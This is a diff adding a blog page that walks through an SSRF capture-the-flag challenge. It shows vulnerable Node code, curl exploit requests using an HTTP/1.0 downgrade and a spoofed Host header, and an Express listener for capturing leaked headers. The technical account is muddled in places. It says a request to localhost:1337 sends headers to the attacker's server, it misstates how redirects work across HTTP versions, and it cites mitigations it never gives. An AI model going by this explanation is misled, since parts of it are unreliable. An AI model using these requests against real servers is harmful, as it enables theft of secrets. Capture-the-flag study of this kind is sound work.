@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Web_Dusty_alleys</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Web_Dusty_alleys | c0derpwner BlogSpot</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Web_Dusty_alleys" />
+<meta name="author" content="c0derpwnergit remote add origin" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Exploiting SSRF Vulnerabilities" />
+<meta property="og:description" content="Exploiting SSRF Vulnerabilities" />
+<link rel="canonical" href="http://localhost:4000/Web_Dusty_alleys" />
+<meta property="og:url" content="http://localhost:4000/Web_Dusty_alleys" />
+<meta property="og:site_name" content="c0derpwner BlogSpot" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-04-14T00:00:00+02:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Web_Dusty_alleys" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"c0derpwnergit remote add origin","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2025-04-14T00:00:00+02:00","datePublished":"2025-04-14T00:00:00+02:00","description":"Exploiting SSRF Vulnerabilities","headline":"Web_Dusty_alleys","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Web_Dusty_alleys"},"url":"http://localhost:4000/Web_Dusty_alleys"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>c0derpwner@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Web_Dusty_alleys</h2>
+  <time datetime="2025-04-14T00:00:00+02:00" class="by-line">14 Apr 2025</time>
+  <h1 id="exploiting-ssrf-vulnerabilities">Exploiting SSRF Vulnerabilities</h1>
+
+<p>In this article, we will walk through the exploitation of a Server-Side Request Forgery (SSRF) vulnerability, particularly focusing on how attackers can misuse the HTTP/1.0 protocol downgrade technique to manipulate the server’s behavior, leak sensitive data, and exfiltrate secrets.
+What is SSRF?</p>
+
+<p>Server-Side Request Forgery (SSRF) is a vulnerability where an attacker tricks the server into making an HTTP request to an unintended resource. SSRF vulnerabilities typically arise when a server is allowed to fetch URLs provided by a user, but without proper validation or restrictions. This can lead to several serious security issues, including:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Information leakage: Sensitive data can be sent to an attacker-controlled server.
+
+Internal network scanning: Attackers can use the vulnerability to probe internal services or servers within the organization.
+
+Exploitation of other vulnerabilities: In some cases, SSRF can be used to exploit other vulnerabilities, such as those in internal services, databases, or authentication systems.
+</code></pre></div></div>
+
+<p>In this guide, we’ll see how an attacker might exploit an SSRF vulnerability to leak sensitive headers (like cookies or authentication tokens) to an external server under their control.
+Overview of the Attack</p>
+
+<p>The SSRF attack we’ll be demonstrating involves the following steps:</p>
+
+<ul>
+  <li>
+    <p>Identify the Vulnerability: An application allows the user to provide a URL (e.g., via a quote parameter) which it will then fetch using a server-side HTTP client (such as node-fetch).</p>
+  </li>
+  <li>
+    <p>Exploit the Vulnerability Using HTTP/1.0: By downgrading the request to HTTP/1.0, the attacker can bypass certain redirect handling mechanisms and gain better control over the server’s behavior.</p>
+  </li>
+  <li>
+    <p>Capture Sensitive Headers: The attacker crafts a malicious request that causes the server to fetch a URL they control, exfiltrating sensitive headers like the Key header, which may contain a flag or other sensitive information.</p>
+  </li>
+</ul>
+
+<h1 id="step-1-identifying-the-vulnerability">Step 1: Identifying the Vulnerability</h1>
+
+<p>The application you’re targeting allows users to submit a URL via the quote parameter. When the application processes this parameter, it uses an HTTP client (like node-fetch) to make a request to the provided URL, and may forward sensitive headers such as cookies or authentication tokens.</p>
+
+<p>Example of the vulnerable code:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>router.get("/guardian", async (req, res) =&gt; {
+  const quote = req.query.quote;
+  try {
+    let result = await node_fetch(quote, {
+      method: "GET",
+      headers: { Key: process.env.FLAG || "HTB{REDACTED}" },
+    }).then((res) =&gt; res.text());
+
+    res.set("Content-Type", "text/plain");
+    res.send(result);
+  } catch (e) {
+    console.error(e);
+    return res.render("guardian", { error: "The words are lost in my circuits" });
+  }
+});
+</code></pre></div></div>
+
+<p>Flaw: There is no restriction on where the quote parameter points. The application blindly fetches the URL and forwards headers like Key to the external server.</p>
+
+<h1 id="step-2-downgrading-to-http10">Step 2: Downgrading to HTTP/1.0</h1>
+
+<p>One of the critical techniques in this attack is downgrading the HTTP version to HTTP/1.0. By doing this, the attacker ensures that the application’s HTTP client behaves differently and may not follow certain redirects, giving the attacker more control over the request.
+Why Use HTTP/1.0?</p>
+
+<p>No Automatic Redirects: In HTTP/1.1 and HTTP/2, redirections (via the Location header) are automatically followed. In HTTP/1.0, redirects must be handled manually by the client. This gives the attacker the ability to intercept and control redirects.</p>
+
+<p>Bypassing Server Behavior: Many modern servers may optimize for HTTP/1.1 or HTTP/2, handling headers differently. By forcing HTTP/1.0, attackers may bypass these optimizations and force the server to handle requests in a less secure way.</p>
+
+<h1 id="how-to-force-http10-using-curl">How to Force HTTP/1.0 Using curl:</h1>
+
+<p>To force HTTP/1.0 in your request, you can use the <code class="language-plaintext highlighter-rouge">--http1.0</code> flag with curl.</p>
+
+<p>Example command to downgrade to HTTP/1.0:</p>
+
+<p><code class="language-plaintext highlighter-rouge">curl http://$IP:$PORT/think --http1.0 -H 'Host:'</code></p>
+
+<p>In this case, you’re sending an HTTP request to the /think route with an empty Host header. This step helps you test and verify how the server responds to HTTP/1.0 requests and may reveal virtual hosts or internal configuration details.</p>
+
+<p>Example Response:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="p">{</span><span class="w">
+  </span><span class="nl">"host"</span><span class="p">:</span><span class="w"> </span><span class="s2">"alley.firstalleyontheleft.com"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"x-real-ip"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.30.18.174"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"x-forwarded-for"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.30.18.174"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"x-forwarded-proto"</span><span class="p">:</span><span class="w"> </span><span class="s2">"http"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"connection"</span><span class="p">:</span><span class="w"> </span><span class="s2">"close"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"user-agent"</span><span class="p">:</span><span class="w"> </span><span class="s2">"curl/8.12.1"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"accept"</span><span class="p">:</span><span class="w"> </span><span class="s2">"*/*"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>Key Information: You can see the host field, which identifies the virtual host used (alley.firstalleyontheleft.com), along with additional headers that might help identify how the server is configured or its internal structure.</p>
+
+<p>Step 3: Exploiting the SSRF Vulnerability</p>
+
+<p>With the knowledge gained in Step 1 and Step 2, the attacker can now craft an exploit that forces the server to make a request to a location controlled by the attacker.</p>
+
+<p>The goal is to make the server fetch a URL that exfiltrates sensitive headers. The quote parameter in the vulnerable /guardian endpoint can be manipulated to point to the attacker’s server (which will capture the request headers).</p>
+
+<p>Exploit Request:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://$IP:$PORT/guardian?quote=http%3A%2F%2Flocalhost%3A1337%2Fthink -H 'Host: guardian.firstalleyontheleft.com'
+</code></pre></div></div>
+
+<p>Explanation: quote=http%3A%2F%2Flocalhost%3A1337%2Fthink is the URL-encoded path that will make the server send a request to <code class="language-plaintext highlighter-rouge">http://localhost:1337/think</code>
+<code class="language-plaintext highlighter-rouge">Host: guardian.firstalleyontheleft.com</code> specifies the target virtual host for the request.</p>
+
+<p>When the vulnerable server processes this request, it will make a server-side request to <strong><code class="language-plaintext highlighter-rouge">http://localhost:1337/think</code></strong>, and any sensitive headers (like Key, which might contain the flag) will be forwarded to the attacker’s server.</p>
+
+<h1 id="step-4-capture-the-flag">Step 4: Capture the Flag</h1>
+
+<p>The attacker must set up a server to listen for incoming HTTP requests and capture sensitive headers like the Key header, which may contain the flag.</p>
+
+<p>Example attacker server using Node.js (Express):</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">);</span>
+<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">();</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Received headers:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">headers</span><span class="p">);</span> <span class="c1">// Capture sensitive headers</span>
+    <span class="nx">res</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Request received!</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="mi">1337</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">Server is listening on port 1337</span><span class="dl">'</span><span class="p">);</span>
+<span class="p">});</span>
+
+</code></pre></div></div>
+
+<p>In this article, we’ve walked through the process of exploiting an SSRF vulnerability, leveraging HTTP/1.0 downgrades to manipulate server behavior, and capturing sensitive data through crafted HTTP requests. By following this methodology, attackers can exfiltrate secrets from vulnerable applications, while defenders can use the outlined mitigations to secure their systems from such attacks. Always be aware of SSRF risks and take proactive steps to mitigate them.</p>
+
+<p><img src="assets/ach/dusty_alley.png" alt="image" /></p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>c0derpwner</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
